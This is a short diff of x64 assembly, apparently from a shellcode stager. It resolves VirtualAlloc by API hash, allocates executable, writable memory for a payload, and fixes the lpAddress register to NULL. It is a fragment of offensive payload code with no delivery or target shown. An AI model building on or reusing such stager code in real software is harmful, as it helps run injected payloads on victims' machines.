@@ -22,7 +22,7 @@ start:
   mov r9d,0x40                    ; PAGE_EXECUTE_READ_WRITE
   mov r8d,0x00103000              ; MEM_COMMIT | MEM_TOP_DOWN | MEM_RESERVE
   mov rdx,[rsp]                   ; dwSize
-  mov rcx,rcx                     ; lpAddress
+  xor rcx,rcx                     ; lpAddress
   xchg rsp,rbp                    ; Swap shadow stack
   mov r10d,0x2C39DFEC             ; crc32("KERNEL32.DLL", "VirtualAlloc")
   call api_call                   ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
